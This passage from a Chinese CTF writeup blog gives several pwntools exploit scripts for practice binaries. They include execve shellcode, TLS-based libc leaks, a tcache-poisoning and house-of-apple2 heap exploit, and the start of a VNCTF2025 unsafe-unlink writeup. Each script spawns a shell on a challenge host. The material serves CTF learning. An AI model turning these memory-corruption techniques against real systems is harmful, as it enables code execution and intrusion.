class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br><br>e = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-built_in">print</span>(e.plt[<span class="hljs-string">&quot;mprotect&quot;</span>])<br>io = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-comment"># io = gdb.debug(&quot;./pwn&quot;, &quot;&quot;&quot;b main</span><br><span class="hljs-comment">#                b *(0x4011AF)</span><br><span class="hljs-comment">#                &quot;&quot;&quot;)</span><br><span class="hljs-comment"># io = remote(&quot;125.220.147.47&quot;,49385)</span><br>shellcode = <span class="hljs-string">&quot;&quot;&quot;mov rbp, 0x404500</span><br><span class="hljs-string">    mov rsp, rbp</span><br><span class="hljs-string">    lea r15, [rip+0xe00]</span><br><span class="hljs-string">    sub r15, 0xe16</span><br><span class="hljs-string">    mov rdi, r15</span><br><span class="hljs-string">    mov rsi, 0x1000</span><br><span class="hljs-string">    mov rdx, 0x7</span><br><span class="hljs-string">    mov rax, 0x401070</span><br><span class="hljs-string">    call rax</span><br><span class="hljs-string">    mov si, word ptr [r15 + 0x100] </span><br><span class="hljs-string">    add si, 0x101              </span><br><span class="hljs-string">    mov word ptr [r15 + 0x100], si</span><br><span class="hljs-string">    push 0x68</span><br><span class="hljs-string">    mov rax, 0x732f2f2f6e69622f</span><br><span class="hljs-string">    push rax</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    /* push argument array [&#x27;sh\x00&#x27;] */</span><br><span class="hljs-string">    /* push b&#x27;sh\x00&#x27; */</span><br><span class="hljs-string">    push 0x1010101 ^ 0x6873</span><br><span class="hljs-string">    xor dword ptr [rsp], 0x1010101</span><br><span class="hljs-string">    xor esi, esi /* 0 */</span><br><span class="hljs-string">    push rsi /* null terminate */</span><br><span class="hljs-string">    push 8</span><br><span class="hljs-string">    pop rsi</span><br><span class="hljs-string">    add rsi, rsp</span><br><span class="hljs-string">    push rsi /* &#x27;sh\x00&#x27; */</span><br><span class="hljs-string">    mov rsi, rsp</span><br><span class="hljs-string">    xor edx, edx /* 0 */</span><br><span class="hljs-string">    /* call execve() */</span><br><span class="hljs-string">    push SYS_execve /* 0x3b */</span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>payload = (<span class="hljs-string">b&quot;\x00\xc0&quot;</span>+asm(shellcode)).ljust(<span class="hljs-number">0x100</span>-<span class="hljs-number">3</span>, <span class="hljs-string">b&quot;\x90&quot;</span>)+<span class="hljs-string">b&quot;\x0e\x04&quot;</span><br><br><span class="hljs-built_in">print</span>(payload)<br>io.send(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="shell-for-another-shell"><a href="#shell-for-another-shell" class="headerlink" title="shell_for_another_shell"></a>shell_for_another_shell</h1><p>和上一题一样，但开了pie，现在考虑利用<code>fs</code>寄存器泄露tls，进而泄露libc。拿到libc后我们可以通过<code>environ</code>变量获取栈帧地址，恢复栈帧，进而调用system函数get shell</p><h3 id="为什么不用syscall？"><a href="#为什么不用syscall？" class="headerlink" title="为什么不用syscall？"></a>为什么不用<code>syscall</code>？</h3><p>当我们使用syscall调用<code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code>打远程时会发现远程打不通。我们认为这是远程环境使用busybox的原因。<br>如果你曾经调试过<code>shellcraft</code>生成的shellcode就会发现，它实际上会给<code>execve</code>的<code>argv</code>传参，这样做之后远程也能正常打通了。这是因为<strong>busybox 是通过 <code>argv[0]</code>定位程序的，如果没有<code>argv</code>参数，busybox就不能识别功能，抛出<code>applet not found</code>错误。</strong><br>可以参考busybox源码：<a href="https://elixir.bootlin.com/busybox/0.50/source/applets/busybox.c#L88">https://elixir.bootlin.com/busybox/0.50/source/applets/busybox.c#L88</a></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    author: powchan</span><br><span class="hljs-string">    time: 2025-03-29 17:44:30</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br>filename = <span class="hljs-string">&quot;pwn_patched&quot;</span><br>host = <span class="hljs-string">&quot;125.220.147.47&quot;</span>  <br>port = <span class="hljs-number">49521</span><br>elf = context.binary = ELF(filename)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><span class="hljs-built_in">print</span>(libc.sym[<span class="hljs-string">&quot;system&quot;</span>])<br>gs = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b main</span><br><span class="hljs-string">b *$rebase(0x11c3)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>():<br>    <span class="hljs-keyword">if</span> args.P:<br>        <span class="hljs-keyword">return</span> process(elf.path)<br>    <span class="hljs-keyword">elif</span> args.R:<br>        <span class="hljs-keyword">return</span> remote(host, port)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> gdb.debug(elf.path, gdbscript = gs)<br><br>io = start()<br><span class="hljs-comment">#4    add r14, 0x29db4</span><br>shellcode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    xor eax, eax</span><br><span class="hljs-string">    add r13, fs:0x0</span><br><span class="hljs-string">    lea r15, [rip]</span><br><span class="hljs-string">    sub r15, 0x15</span><br><span class="hljs-string">    add r13, 0x28c0</span><br><span class="hljs-string">    mov r14, r13</span><br><span class="hljs-string">    add r14, 0x222200</span><br><span class="hljs-string">    lea r14, [r14]</span><br><span class="hljs-string">    mov rbp, r14</span><br><span class="hljs-string">    mov rsp, r14</span><br><span class="hljs-string">    add r13, 0x40d70</span><br><span class="hljs-string">    add r13, 0x10000</span><br><span class="hljs-string">    xor rax, rax</span><br><span class="hljs-string">    mov rdi, r15</span><br><span class="hljs-string">    add rdi, 0x200</span><br><span class="hljs-string">    xor r15, r15</span><br><span class="hljs-string">    call r13</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>slcode = asm(shellcode)<br>payload = (slcode).ljust(<span class="hljs-number">0x200</span>-<span class="hljs-number">3</span>, <span class="hljs-string">b&quot;/&quot;</span>)+ <span class="hljs-string">b&quot;/bin/sh\x00&quot;</span><br><span class="hljs-built_in">print</span>(payload)<br>io.send(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><h3 id="高版本内核下的新情况"><a href="#高版本内核下的新情况" class="headerlink" title="高版本内核下的新情况"></a>高版本内核下的新情况</h3><p>在6.8版本内核中，tls和libc的偏移不再固定。考虑到2.35libc下只有一个syscall，我们可以通过在shellcode搜索syscall的字节码的方式定位libc。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    author: powchan</span><br><span class="hljs-string">    time: 2025-03-29 17:44:30</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>filename = <span class="hljs-string">&quot;pwn&quot;</span><br>host = <span class="hljs-string">&quot;125.220.147.47&quot;</span><br>port = <span class="hljs-number">49398</span><br><br>elf = context.binary = ELF(filename)<br>gs = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b main</span><br><span class="hljs-string">b *$rebase(0x11c3)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>():<br>    <span class="hljs-keyword">if</span> args.P:<br>        <span class="hljs-keyword">return</span> process(elf.path)<br>    <span class="hljs-keyword">elif</span> args.R:<br>        <span class="hljs-keyword">return</span> remote(host, port)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> gdb.debug(elf.path, gdbscript = gs)<br><br>io = start()<br><span class="hljs-comment">#4    add r14, 0x29db4</span><br>shellcode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    xor eax, eax</span><br><span class="hljs-string">    add r13, fs:0x0</span><br><span class="hljs-string">    lea r15, [rip+0xe00]</span><br><span class="hljs-string">    sub r15, 0xe15</span><br><span class="hljs-string">    sub r13, 0x740</span><br><span class="hljs-string">    add rdi, 0x040e</span><br><span class="hljs-string">    add rdi, 0x0101</span><br><span class="hljs-string">    xor rbx, rbx    </span><br><span class="hljs-string">loop:</span><br><span class="hljs-string">    mov rax, rbx             </span><br><span class="hljs-string">    shl rax, 12               </span><br><span class="hljs-string">    lea rcx, [r13+0x29db4-0x230000]   </span><br><span class="hljs-string">    sub rcx, rax           </span><br><span class="hljs-string">    cmp word ptr [rcx], di</span><br><span class="hljs-string">    nop</span><br><span class="hljs-string">    je found</span><br><span class="hljs-string">    nop                </span><br><span class="hljs-string">    inc rbx </span><br><span class="hljs-string">    nop                 </span><br><span class="hljs-string">    jmp loop  </span><br><span class="hljs-string">    nop         </span><br><span class="hljs-string">found:</span><br><span class="hljs-string">    mov r11, rcx </span><br><span class="hljs-string">    mov rdi, r15</span><br><span class="hljs-string">    add rdi, 0x200</span><br><span class="hljs-string">    xor rcx, rcx</span><br><span class="hljs-string">    xor rax, rax</span><br><span class="hljs-string">    xor rbx, rbx</span><br><span class="hljs-string">    xor r13, r13</span><br><span class="hljs-string">    xor r15, r15</span><br><span class="hljs-string">    add rax, 0x3b</span><br><span class="hljs-string">    jmp r11</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>slcode = asm(shellcode)<br>payload = (slcode).ljust(<span class="hljs-number">0x200</span>-<span class="hljs-number">3</span>, <span class="hljs-string">b&quot;\x90&quot;</span>)+ <span class="hljs-string">b&quot;/bin/sh\x00&quot;</span><br><span class="hljs-built_in">print</span>(payload)<br>io.send(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h1><p>堆块大小无下限，也就是有tcache，还有非常巨大的堆溢出，直接<code>tcache poison</code>+<code>house of apple2</code>一把梭即可</p><blockquote><p>tcache在libc2.32版本加入了指针异或保护，需要leak堆地址才能正常投毒</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    author: powchan</span><br><span class="hljs-string">    time: 2025-03-30 09:50:01</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>filename = <span class="hljs-string">&quot;pwn&quot;</span><br>libcname = <span class="hljs-string">&quot;./libc.so.6&quot;</span><br>host = <span class="hljs-string">&quot;125.220.147.47&quot;</span><br>port = <span class="hljs-number">49470</span><br>elf = context.binary = ELF(filename)<br><span class="hljs-keyword">if</span> libcname:<br>    libc = ELF(libcname)<br>gs = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b main</span><br><span class="hljs-string">b *(*main+32)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>():<br>    <span class="hljs-keyword">if</span> args.P:<br>        <span class="hljs-keyword">return</span> process(elf.path)<br>    <span class="hljs-keyword">elif</span> args.R:<br>        <span class="hljs-keyword">return</span> remote(host, port)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> gdb.debug(elf.path, gdbscript = gs)<br><br>menu = <span class="hljs-string">b&#x27;5.exit\n&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx, size</span>):<br>    io.sendlineafter(menu, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">b&#x27;Idx:\n&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br>    io.sendlineafter(<span class="hljs-string">b&#x27;Size:\n&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    io.sendlineafter(menu, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">b&#x27;Idx\n&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br>    io.recvuntil(<span class="hljs-string">b&#x27;Content\n&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    io.sendlineafter(menu, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">b&#x27;Idx\n&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, content</span>): <br>    io.sendlineafter(menu, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">b&#x27;Idx\n&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br>    io.sendafter(<span class="hljs-string">b&#x27;Content\n&#x27;</span>, content)<br>    <br>io = start()<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x10</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(i+<span class="hljs-number">1</span>, <span class="hljs-number">0xf0</span>)<br>add(<span class="hljs-number">8</span>, <span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">9</span>, <span class="hljs-number">0xf0</span>)<br>add(<span class="hljs-number">10</span>, <span class="hljs-number">0x10</span>)<br>free(<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">0</span>, <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x20</span>)<br>show(<span class="hljs-number">0</span>)<br>io.recvuntil(<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x20</span>)<br>key = u64(io.recv(<span class="hljs-number">5</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>heap_base = key &lt;&lt; <span class="hljs-number">12</span><br>log.success(<span class="hljs-string">f&quot;heap_base&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(heap_base)&#125;</span>&quot;</span>)<br>edit(<span class="hljs-number">0</span>, <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x101</span>))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    free(i+<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">9</span>)<br>edit(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x20</span>)<br>show(<span class="hljs-number">8</span>)<br>io.recvuntil(<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x20</span>)<br>libc_base = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x21ace0</span><br>log.success(<span class="hljs-string">f&quot;libc_base&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)<br>edit(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x101</span>))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    add(i+<span class="hljs-number">1</span>, <span class="hljs-number">0xf0</span>)<br>free(<span class="hljs-number">6</span>)<br>free(<span class="hljs-number">7</span>)<br>io_list_all = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>edit(<span class="hljs-number">0</span>, <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x101</span>) + p64((io_list_all)^key))<br>add(<span class="hljs-number">6</span>, <span class="hljs-number">0xf0</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0xf0</span>)<br>fake_io_addr = heap_base +<span class="hljs-number">0x13d0</span><br>edit(<span class="hljs-number">1</span>, p64(fake_io_addr))<br>fake_io = flat(<br>&#123;<br><span class="hljs-number">0x0</span>: <span class="hljs-string">b&quot;  sh&quot;</span>,<br><span class="hljs-number">0x28</span>: libc_base + libc.sym[<span class="hljs-string">&quot;system&quot;</span>],<br><span class="hljs-number">0xA0</span>: fake_io_addr + <span class="hljs-number">0xD0</span> - <span class="hljs-number">0xE0</span>, <span class="hljs-comment"># _wide_data-&gt;_wide_vtable</span><br><span class="hljs-number">0xD0</span>: fake_io_addr+ <span class="hljs-number">0x28</span> - <span class="hljs-number">0x68</span>, <span class="hljs-comment"># _wide_data-&gt;_wide_vtable-&gt;doallocate</span><br><span class="hljs-number">0xD8</span>: libc_base + libc.sym[<span class="hljs-string">&quot;_IO_wfile_jumps&quot;</span>], <span class="hljs-comment"># vtable _IO_wfile_jumps-0x48</span><br>&#125;,<br>filler=<span class="hljs-string">b&#x27;\x00&#x27;</span>,<br>)<br>edit(<span class="hljs-number">2</span>, fake_io)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>VNCTF2025 LateBinding非预期解</title>
    <link href="/2025/03/05/VNCTF2025-LateBinding%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3/"/>
    <url>/2025/03/05/VNCTF2025-LateBinding%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h2 id="Late-Binding非预期解：unsafe-unlink"><a href="#Late-Binding非预期解：unsafe-unlink" class="headerlink" title="Late Binding非预期解：unsafe unlink"></a>Late Binding非预期解：unsafe unlink</h2><p>题目&amp;官方题解： <a href="https://ctf.vnteam.cn/training/1?challenge=51">https://ctf.vnteam.cn/training/1?challenge=51</a><br>官方题解的<code>house of muney</code>还是太吃操作了，有没有更简单的解法？<br>有的兄弟，有的。<br>如题，这里我们使用unsafe unlink攻击，尝试向<code>heap list</code>中写入<code>&amp;heap_list</code>，进而得到主程序上任意地址读写的权限，这样我们就可以泄露libc再打<code>got hijack</code>了。<br><code>unsafe unlink</code>是很简单的攻击手法，一搜就能得到大量教程。但这题的unlink似乎<strong>不太一样</strong>。<br>仔细看看，堆块的大小是有下限的，至少<code>0x20000</code>，而且没有UAF，我们根本不能在heap段上搞出两个被free的chunk来unlink！<br>但没关系。我们把3个堆都分配出来之后可以发现，这三个chunk有一个在heap内存空间上，另外两个在libc前面的地址空间上，并且这两个chunk<strong>物理相邻</strong>！这样的话，我们就可以考虑在这段内存空间上<strong>伪造一些chunk</strong>（尤其注意<strong>IS_MMAPED</strong>段，<strong>必须覆盖为0</strong>），再利用这些伪造的chunk进行unlink就行了！<br>想法挺好的，但接下来我们的伪造可能会有各种报错，我们需要参考libc源码解决这些问题。先把libc源码贴在这里: <a href="https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c">https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c</a><br>首先我们知道，unlink的基础是知道程序的基地址。那么基地址怎么泄露呢？注意到程序在<code>$rebase(0x4068)</code>处有一个指针是自指的，那么只要用读取函数读这里就可以拿到基地址了。<br>布置好大量堆块后unlink，发现程序还是会报错。原来是有一个检查：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span> (__builtin_expect (contiguous (av)<br>  &amp;&amp; (<span class="hljs-type">char</span> *) nextchunk<br>  &gt;= ((<span class="hljs-type">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="hljs-number">0</span>))<br>malloc_printerr (<span class="hljs-string">&quot;double free or corruption (out)&quot;</span>);<br></code></pre></td></tr></table></figure><p>这其实好办，只要把top chunk的size修改得很大就可以了。这样我们就成功unlink、拿到shell。附wp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    author: GeekCmore</span><br><span class="hljs-string">    time: 2025-02-26 15:45:14</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>filename = <span 